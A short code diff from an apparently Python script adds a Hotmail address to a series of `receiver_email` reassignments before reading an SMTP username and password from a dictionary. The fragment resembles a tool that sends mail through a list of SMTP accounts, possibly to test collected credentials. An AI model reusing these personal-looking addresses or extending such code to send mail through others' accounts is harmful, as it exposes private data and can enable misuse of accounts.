@@ -363,6 +363,8 @@ for x in range(1):
 		receiver_email = "adamoyler2705cc@web.de"
 		receiver_email = "kamlal.fahmi@yahoo.com"
 		receiver_email = "adamhardison284@gmail.com"
+		receiver_email = "sophie.blarbi44@hotmail.com"
+		
 		sender_email = smtp['username']
 		password = smtp['pass']
 		for y in range(1):
